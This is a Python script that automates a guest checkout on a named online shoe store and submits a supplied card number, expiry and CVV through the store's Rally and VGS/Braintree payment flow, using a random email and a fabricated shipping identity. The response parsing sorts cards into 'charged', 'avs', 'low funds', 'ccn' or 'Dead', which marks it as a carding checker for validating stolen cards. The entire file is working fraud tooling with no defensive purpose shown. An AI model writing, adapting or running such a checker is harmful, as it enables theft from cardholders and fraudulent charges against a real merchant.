from utilsdf.functions import  capture, random_email
from httpx import AsyncClient
from datetime import datetime, timezone
import urllib.parse


async def brenda(cc, month, year, cvv):
    mail = random_email()

    async with AsyncClient(
        follow_redirects=True, verify=False, 
    ) as session:
        r = await session.get(
            "https://burjushoes.com/diamond-dazzle-fishnet-body-stocking/"
        )
        cookies_1 = "; ".join([f"{key}={value}" for key, value in r.cookies.items()])

        xsrf = urllib.parse.unquote(capture(cookies_1, "XSRF-TOKEN=", ";"))

        h2 = {
            "Host": "burjushoes.com",
            "origin": "https://burjushoes.com",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqtFtTx3AkC77qfwp",
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "referer": "https://burjushoes.com/diamond-dazzle-fishnet-body-stocking/",
            "stencil-options": "{}",
            "stencil-config": "{}",
            "x-xsrf-token": f"{xsrf}",
        }

        p2 = """------WebKitFormBoundaryqtFtTx3AkC77qfwp
Content-Disposition: form-data; name="action"

add
------WebKitFormBoundaryqtFtTx3AkC77qfwp
Content-Disposition: form-data; name="product_id"

1129
------WebKitFormBoundaryqtFtTx3AkC77qfwp
Content-Disposition: form-data; name="attribute[8236]"

2418
------WebKitFormBoundaryqtFtTx3AkC77qfwp
Content-Disposition: form-data; name="qty[]"

1
------WebKitFormBoundaryqtFtTx3AkC77qfwp--
"""

        r2 = await session.post(
            "https://burjushoes.com/remote/v1/cart/add",
            headers=h2,
            data=p2,
        )
        t2 = r2.text
        cart_id = capture(t2, '"cart_id":"', '"')
        id_ = capture(t2, '"id":"', '"')

        h3 = {
            "Host": "api.onrally.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Origin": "https://burjushoes.com",
            "Content-Type": "application/json",
            "Accept": "*/*",
        }

        c_time = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S%z")

        p3 = {
            "client_id": "979a8081-ada4-4a19-99de-0864af46d7bf",
            "cart_id": f"{cart_id}",
            "cart_currency": "USD",
            "cart": {
                "id": f"{cart_id}",
                "cart": {
                    "id": f"{cart_id}",
                    "customer_id": 0,
                    "email": "",
                    "currency": {
                        "name": "US Dollars",
                        "code": "USD",
                        "symbol": "$",
                        "decimal_places": 2,
                    },
                    "is_tax_included": False,
                    "base_amount": 19,
                    "discount_amount": 0,
                    "cart_amount": 19,
                    "coupons": [],
                    "discounts": [{"id": f"{id_}", "discounted_amount": 0}],
                    "line_items": {
                        "physical_items": [
                            {
                                "id": f"{id_}",
                                "parent_id": None,
                                "variant_id": 119528,
                                "product_id": 1129,
                                "sku": "DDFBS-BLK",
                                "name": "Diamond Dazzle Fishnet Body Stocking",
                                "url": "https://burjushoes.com/diamond-dazzle-fishnet-body-stocking/",
                                "quantity": 1,
                                "brand": "Burju",
                                "is_taxable": True,
                                "image_url": "https://cdn11.bigcommerce.com/s-fngyfy6rex/products/1129/images/9272/Diamond-Dazzle-Fishnet-Body-Stocking-1__78418.1696976593.220.290.jpg?c=2",
                                "discounts": [],
                                "discount_amount": 0,
                                "coupon_amount": 0,
                                "original_price": 19,
                                "list_price": 19,
                                "sale_price": 19,
                                "retail_price": None,
                                "extended_list_price": 19,
                                "extended_sale_price": 19,
                                "comparison_price": 19,
                                "extended_comparison_price": 19,
                                "is_shipping_required": True,
                                "gift_wrapping": None,
                                "added_by_promotion": False,
                                "is_mutable": True,
                                "options": [
                                    {
                                        "name": "Color",
                                        "name_id": 8236,
                                        "value": "Black",
                                        "value_id": "2418",
                                    }
                                ],
                            }
                        ],
                        "digital_items": [],
                        "gift_certificates": [],
                        "custom_items": [],
                    },
                    "created_time": f"{c_time}",
                    "updated_time": f"{c_time}",
                    "locale": "en",
                },
                "billing_address": {},
                "consignments": [],
                "order_id": None,
                "shipping_cost_total": 0,
                "shipping_cost_before_discount": 0,
                "handling_cost_total": 0,
                "tax_total": 0,
                "gift_wrapping_cost_total": 0,
                "coupons": [],
                "taxes": [{"name": "Tax", "amount": 0}],
                "subtotal": 19,
                "grand_total": 19,
                "outstanding_balance": 19,
                "is_store_credit_applied": False,
                "should_execute_spam_check": True,
                "gift_certificates": [],
                "created_time": f"{c_time}",
                "updated_time": f"{c_time}",
                "customer_message": "",
                "channel_id": 1,
                "fees": [],
                "customer": {
                    "id": 0,
                    "is_guest": True,
                    "email": "",
                    "first_name": "",
                    "last_name": "",
                    "full_name": "",
                    "addresses": [],
                    "store_credit": 0,
                    "should_encourage_sign_in": False,
                    "customer_group": {"id": 8, "name": "Retail Customer Group"},
                },
                "promotions": [],
                "payments": [{}],
            },
        }

        r3 = await session.post(
            "https://api.onrally.com/api/v1/checkout/auth",
            headers=h3,
            json=p3,
        )
        t3 = r3.text
        ch = capture(t3, '"checkout_session_id":"', '"')

        h4 = {
            "Host": "api.onrally.com",
            "X-Rally-Client-ID": "979a8081-ada4-4a19-99de-0864af46d7bf",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "X-Rally-Checkout-Session": f"{ch}",
            "Origin": "https://checkout.burjushoes.com",
            "Referer": "https://checkout.burjushoes.com/",
        }

        r4 = await session.get(
            f"https://api.onrally.com/api/v1/checkouts/{ch}",
            headers=h4,
        )

        r5 = await session.get(
            f"https://api.onrally.com/api/v1/cart/{ch}?include=shipping_lines,selected_shipping_line_external_id",
            headers=h4,
        )

        h6 = {
            "Host": "api.onrally.com",
            "X-Rally-Client-ID": "979a8081-ada4-4a19-99de-0864af46d7bf",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "X-Rally-Checkout-Session": f"{ch}",
            "Origin": "https://checkout.burjushoes.com",
            "Referer": "https://checkout.burjushoes.com/",
        }

        p6 = {
            "customer": {"email": f"{mail}"},
            "rally_pay": {"status": "invalid"},
            "section": "email",
        }

        r6 = await session.patch(
            f"https://api.onrally.com/api/v1/checkouts/{ch}/email",
            headers=h6,
            json=p6,
        )

        p7 = {
            "customer": {
                "first_name": "Sachio",
                "last_name": "YT",
                "shipping_address": {
                    "first_name": "Sachio",
                    "last_name": "YT",
                    "company": "YT",
                    "address1": "118 W 132nd St",
                    "address2": "YT",
                    "city": "New York",
                    "country": "United States",
                    "province": "New York",
                    "zip": "10027",
                    "phone": "9006318646",
                    "country_code": "US",
                },
            },
            "section": "shipping_address",
        }

        r7 = await session.patch(
            f"https://api.onrally.com/api/v1/checkouts/{ch}/shipping_address",
            headers=h6,
            json=p7,
        )

        h8 = {
            "Host": "tntj5p9kfeq.live.verygoodproxy.com",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "vgs-client": "source=vgs-collect&medium=vgs-collect&content=2.18.3&dataHashIndex=1&randIdentifier=1700325713800&vgsCollectSessionId=63a9401b-d370-4a76-85c6-57f3cbdb20da&tr=default",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://js3.verygoodvault.com",
            "referer": "https://js3.verygoodvault.com/",
        }

        p8 = {
            "card_number": f"{cc}",
            "card_name": "Sachio YT",
            "card_exp": f"{month} / {year}",
            "card_cvc": f"{cvv}",
        }

        r8 = await session.post(
            "https://tntj5p9kfeq.live.verygoodproxy.com/vgs/vault",
            headers=h8,
            json=p8,
        )
        t8 = r8.text
        c_cvc = capture(t8, '"card_cvc":"', '"')
        c_cc = capture(t8, '"card_number":"', '"')

        p9 = {
            "type": "braintree",
            "vgs": "success",
            "error": None,
            "card": {
                "number": f"{c_cc}",
                "exp_month": f"{month}",
                "exp_year": f"{year}",
                "cvc": f"{c_cvc}",
                "name": "Sachio YT",
            },
        }

        r9 = await session.post(
            "https://api.onrally.com/api/v1/gateway/make-payment",
            headers=h6,
            json=p9,
        )
        t9 = r9.text
        msg = capture(t9, '"message":"', '"')

        if r9.status_code == 302 or r9.status_code == 200:
            status = "Approved! ✅ -» charged!"
            msg = "Thanks -» $28.99"
        elif msg == "Payment failed: Gateway Rejected: avs":
            status = "Approved! ✅ -» avs"
        elif msg == "Payment failed: Insufficient Funds":
            status = "Approved! ✅ -» low funds"
        elif (
            msg == "Payment failed: Card Issuer Declined CVV"
            or msg == "Payment failed: Gateway Rejected: avs_and_cvv"
            or msg == "Payment failed: Gateway Rejected: cvv"
        ):
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
